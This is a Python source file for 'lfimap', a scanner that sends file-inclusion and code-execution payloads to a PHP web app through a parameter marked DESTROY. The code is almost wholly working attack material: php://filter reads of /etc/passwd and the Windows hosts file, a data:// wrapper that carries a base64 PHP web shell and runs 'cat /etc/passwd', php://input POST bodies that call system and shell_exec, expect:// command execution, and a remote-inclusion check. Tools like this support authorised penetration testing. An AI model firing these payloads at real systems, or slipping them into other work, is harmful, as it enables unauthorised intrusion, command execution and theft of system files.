#!/usr/bin/env python3

import os
import sys
import re
import socket
import subprocess
import random
import argparse
import requests
import requests.exceptions
import base64

from argparse import RawTextHelpFormatter
from urllib.parse import urlsplit
from urllib.parse import urlparse

def prepareHeaders():
    user_agents = [
                            "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
                            "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
                            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
                            "Mozilla/3.01 (Macintosh; PPC)",
                            "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",
                            "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
                            "Opera/8.00 (Windows NT 5.1; U; en)",
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
                ]

    headers = {}
    headers['User-Agent'] = random.choice(user_agents)
    headers['Accept-Language'] = 'en-US;'
    headers['Accept-Encoding'] = 'gzip, deflate'
    headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;'
    headers['Connection'] = 'Close'

    return headers

def addHeader(newKey, newVal):
    headers[newKey] = newVal

def test_wordlist(url):    
    f = open(wordlist, "r")
    
    for line in f:
        line = line[:-1]
        if("DESTROY" in url):
            u = url.replace("DESTROY", line)

        res = requests.get(u, headers = headers)
        
        if(checkPayload(res)):
            print("[+] LFI -> " + u)
            return  #To prevent further traffic

    f.close()

def test_php_filter(url):
    
    #Test if parameter is vulnerable without encoding
    testCase = "php://filter/resource=/etc/passwd"
    
    if("DESTROY" in url):
        u = url.replace("DESTROY", testCase)

    res = requests.get(u, headers = headers)
    
    if(checkPayload(res)):
        print("[+] LFI -> " + u)

    winOne = "php://filter/resource=C:/Windows/System32/drivers/etc/hosts"
    u = url.replace("DESTROY", winOne)
    
    res = requests.get(u, headers = headers)
    if(checkPayload(res)):
        print("[+] LFI -> " + u)


    #Base64 Encoded
    testCaseTwo = "php://filter/convert.base64-encode/resource=/etc/passwd"
    
    u = url.replace("DESTROY", testCaseTwo)

    res = requests.get(u, headers = headers)

    if(checkPayload(res)):
        print("[+] LFI -> " + u)

    winTwo = "php://filter/convert.base64-encode/resource=C:/Windows/System32/drivers/etc/hosts"
    u = url.replace("DESTROY", winTwo)
    
    res = requests.get(u, headers = headers)
    if(checkPayload(res)):
        print("[+] LFI -> " + u)


    #UTF-8/16 encoded
    testCaseThree = "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd"
    u = url.replace("DESTROY", testCaseThree)
    
    res = requests.get(u, headers = headers)
    if(checkPayload(res)):
        print("[+] LFI -> " + u)
    
    winThree = "php://filter/convert.iconv.utf-8.utf-16/resource=C:/Windows/System32/drivers/etc/hosts"
    u = url.replace("DESTROY", winThree)

    res = requests.get(u, headers = headers)
    if(checkPayload(res)):
        print("[+] LFI -> " + u)

    #ROT13 encoded
    testCaseFour = "php://filter/read=string.rot13/resource=/etc/passwd"
    u = url.replace("DESTROY", testCaseFour)
    res = requests.get(u, headers = headers)
    
    if(checkPayload(res)):
        print("[+] LFI -> " + u)

    winFour = "php://filter/read=string.rot13/resource=C:/Windows/System32/drivers/etc/hosts"
    u = url.replace("DESTROY", winFour)
    
    res = requests.get(u, headers = headers)
    if(checkPayload(res)):
        print("[+] LFI -> " + u)


def test_data_wrapper(url):
    testCase = "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/passwd"
    if("DESTROY" in url):
        u = url.replace("DESTROY", testCase)

    res = requests.get(u, headers = headers)
    
    if(checkPayload(res)):
        print("[+] LFI -> " + u)

    testCaseTwo = "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig"
    if("DESTROY" in url):
        u = url.replace("DESTROY", testCaseTwo)
    res = requests.get(u, headers = headers)

    if(checkPayload(res)):
        print("[+] LFI -> " + u)


def test_php_input(url):
    urlInput = "php://input&cmd=cat%20/etc/passwd"
    testCase = "<? system('cat /etc/passwd');echo exec($_GET['cmd']);?>"
    if("DESTROY" in url):
        u = url.replace("DESTROY", urlInput)
    
    res = requests.post(u, headers = headers, data= testCase)
    
    if(checkPayload(res)):
        print("[+] RCE -> " + u + " -> HTTP POST: " + testCase)

    testCaseTwo = "<?php echo shell_exec($_GET['cmd']) ?>"
    res = requests.post(u, headers = headers, data = testCaseTwo)
    
    if(checkPayload(res)):
        print("[+] RCE -> " + u + " -> HTTP POST: " + testCaseTwo)

    #Windows
    urlInputTwo = "php://input&cmd=ipconfig"
    testCaseThree = "<? system('ipconfig');echo exec_($_GET['cmd']); ?>"
    if("DESTROY" in url):
        u = url.replace("DESTROY", testCaseThree)
    
    res = requests.post(u, headers = headers, data = testCaseThree)
    if(checkPayload(res)):
        print("[+] RCE -> " + u + " -> HTTP POST: " + testCaseThree)

    res = requests.post(u, headers = headers, data = testCaseTwo) #Same POST payload
    if(checkPayload(res)):
        print("[+] RCE -> " + u + " -> HTTP POST: " + testCaseTwo)

def test_expect_wrapper(url):
    testCase = "expect://cat%20%2Fetc%2Fpasswd"
    if("DESTROY" in url):
        u = url.replace("DESTROY", testCase)

    res = requests.get(u, headers = headers)
    
    if(checkPayload(res)):
        print("[+] RCE -> " + u)

    #Windows
    testCaseTwo = "expect://ipconfig"
    if("DESTROY" in url):
        u = url.replace("DESTROY", testCaseTwo)

    res = requests.get(u, headers = headers)
    if(checkPayload(res)):
        print("[+] RCE -> " + u)

def test_rfi(url):
    testCase = "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2FREADME.md"
    if("DESTROY" in url):
        u = url.replace("DESTROY", testCase)
    try:
        res = requests.get(u, headers = headers, timeout = 5)
        if(checkPayload(res)):
            print("[+] RFI -> " + u)
    except:
        print("\nRFI check timed out\n")



#You can add custom patterns in responses depending on the wordlist used
#Checks if sent payload is executed
def checkPayload(webResponse):
    KEY_WORDS = ["root:x:0:0", "www-data:", "HTTP_USER_AGENT",
            "cm9vdDp4OjA6MD", "Ond3dy1kYXRhO", "ebbg:k:0:0",
            "jjj-qngn:k", "daemon:x:1:", "r o o t : x : 0 : 0",
            "; for 16-bit app support", "sample HOSTS file used by Microsoft",
            "Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg",
            ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
            "c2FtcGxlIEhPU1RT", "=1943785348b45"]

    for i in range(len(KEY_WORDS)):
        if KEY_WORDS[i] in webResponse.text:
            return True
    return False

def main():

    #Perform all tests
    if(test_all):
        test_php_filter(url)
        test_php_input(url)
        test_data_wrapper(url)
        test_expect_wrapper(url)
        test_rfi(url)
        test_wordlist(url)
        
        print("Done.")
        exit(0)

    default = True

    if(args.wordlist):
        default = False
        test_wordlist(url)
    if(php_filter):
        default = False
        test_php_filter(url)
    if(php_input):
        default = False
        test_php_input(url)
    if(data_wrapper):
        default = False
        test_data_wrapper(url)
    if(expect_wrapper):
        default = False
        test_expect_wrapper(url)

    #Default behaviour
    if(default):
        test_php_filter(url)
        test_php_input(url)
        test_data_wrapper(url)
        test_expect_wrapper(url)
        test_rfi(url)

    print("Done.")
    exit(0)


if(__name__ == "__main__"):
    
    print("")
    parser = argparse.ArgumentParser(description="lfimap, tool for discovering LFI", formatter_class=RawTextHelpFormatter, add_help=False)

    parser.add_argument('url', type=str, metavar="URL", help="""\t\t Url, Ex: "http://example.org/vuln.php?param=DESTROY" """)
    parser.add_argument('--test-php-filter', action="store_true", dest = 'php_filter', help="\t\t Test php filter")
    parser.add_argument('--test-php-input', action="store_true", dest = 'php_input', help="\t\t Test php input")
    parser.add_argument('--test-data', action="store_true", dest = 'data', help="\t\t Test data wrapper")
    parser.add_argument('--test-expect', action="store_true", dest = 'expect', help="\t\t Test expect wrapper")
    parser.add_argument('-a', '--test-all', action="store_true", dest = 'test_all', help="\t\t Test all above + using wordlist")
    parser.add_argument('-c', type=str, metavar="<cookie>", dest='cookie', help='\t\t Session Cookie, Ex: "PHPSESSID=1943785348b45"')
    parser.add_argument('-w', type=str, metavar="<wordlist>", dest='wordlist', help="\t\t Custom wordlist (default wordlist.txt)")
    parser.add_argument('-h', '--help', action="help", default=argparse.SUPPRESS, help="\t\t Print this help message")

    args = parser.parse_args()

    url = args.url
    php_filter = args.php_filter
    data_wrapper = args.data
    expect_wrapper = args.expect
    php_input = args.php_input
    cookie = args.cookie
    wordlist = args.wordlist
    test_all = args.test_all

    #Checks URL arg
    urlRegex = re.compile(
    r'^(?:http|ftp)s?://' # http:// or https:// or ftp://
    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
    r'localhost|' #localhost...
    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
    r'(?::\d+)?' # optional port
    r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    
    
    if("DESTROY" not in url):
        print("Please use DESTROY as a vulnerable parameter value that you want to exploit\n")
        sys.exit(-1)

    if(not cookie):
        print("WARNING: Cookie argument ('-c') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.\n")
    
    if(re.match(urlRegex, url) is None):
        print("URL not valid, exiting...")
        sys.exit(-1)

    if(test_all or wordlist):
        if(input("Testing with wordlist ('-w', '-a') might generate a lot of traffic to the target. Are you sure you want to continue (y/n): ") != "y"):
            print("Exiting ...")
            sys.exit(0)

    #Checks if provided wordlist arg exists, in main is selects wordlist based on target OS type
    if(wordlist is not None):
        if(not os.path.isfile(wordlist)):
            print("Specified wordlist doesn't exist. Exiting...")
            sys.exit(-1)
    else:
        wordlist = "wordlist.txt"
     
    headers = prepareHeaders()

    if(cookie is not None):
        addHeader('Cookie', cookie)

    main()